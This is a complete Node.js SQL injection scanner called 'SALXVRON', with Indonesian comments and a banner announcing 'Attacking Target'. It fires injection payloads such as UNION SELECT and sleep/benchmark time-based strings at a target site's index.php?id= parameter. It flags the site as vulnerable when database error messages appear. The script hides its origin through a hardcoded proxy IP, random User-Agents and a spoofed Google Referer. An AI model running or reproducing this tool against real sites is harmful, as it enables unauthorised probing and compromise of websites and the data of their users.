
   const axios = require('axios');
const userAgent = require('random-useragent');
const tunnel = require('tunnel');
const chalk = require('chalk');
const ora = require('ora');
const figlet = require('figlet');
const gradient = require('gradient-string');
const moment = require('moment');

const sqlPayloads = [
    "' OR 1=1 --", "\" OR 1=1 --", "' UNION SELECT null, null, null --",
    "1' AND 1=1 --", "1' AND 1=2 --", "' OR sleep(5) --", "\" OR sleep(5) --",
    "' AND benchmark(5000000,MD5(1)) --", "\" AND benchmark(5000000,MD5(1)) --"
];

const sqlErrors = [
    "SQL syntax", "mysql_fetch", "ORA-01756", "Microsoft OLE DB Provider",
    "Unclosed quotation mark", "You have an error in your SQL syntax",
    "pg_query(): Query failed", "syntax error at or near"
];

const proxyConfig = tunnel.httpsOverHttp({
    proxy: {
        host: '52.73.224.54',  // Ganti dengan IP proxy jika perlu
        port: 3128,
        auth: 'username:password'
    }
});

if (process.argv.length < 3) {
    console.log(chalk.red("❌ Gunakan: node salxvron.js example.com"));
    process.exit(1);
}

const target = process.argv[2];
const startTime = moment().format('YYYY-MM-DD HH:mm:ss');
const method = "SQL Injection (Error-Based)";

// Tampilkan Logo SALXVRON
console.log(gradient.pastel(figlet.textSync("SALX VRON", { horizontalLayout: "full" })));
console.log(chalk.blue.bold(`\n🚀 SALXVRON - SQLi Scanner`));
console.log(chalk.green(`🛡️ Attacking Target : ${target}`));
console.log(chalk.yellow(`⏳ Time: ${startTime}`));
console.log(chalk.cyan(`⚔️ Method: ${method}\n`));

async function scanSQLi(url) {
    console.log(chalk.magentaBright("🔎 Scanning:\n"));

    const spinner = ora(chalk.yellow(`Menganalisis ${url}...`)).start();

    for (let payload of sqlPayloads) {
        let testURL = `${url}${encodeURIComponent(payload)}`;
        let headers = {
            'User-Agent': userAgent.getRandom(),
            'Referer': 'https://google.com',
        };

        try {
            let response = await axios.get(testURL, {
                timeout: 10000,
                headers: headers,
                httpsAgent: proxyConfig
            });

            let responseText = response.data.toString();

            if (sqlErrors.some(error => responseText.includes(error))) {
                spinner.fail(chalk.redBright(`🔥 [VULNERABLE] ${url}`));
                return;
            }

            if (response.status === 500 || response.status === 403) {
                spinner.warn(chalk.yellowBright(`⚠️ [POTENTIALLY VULNERABLE] ${url}`));
                return;
            }

        } catch (error) {
            continue;
        }
    }
    spinner.succeed(chalk.greenBright(`✅ [SAFE] ${url}`));
}

scanSQLi(`http://${target}/index.php?id=`);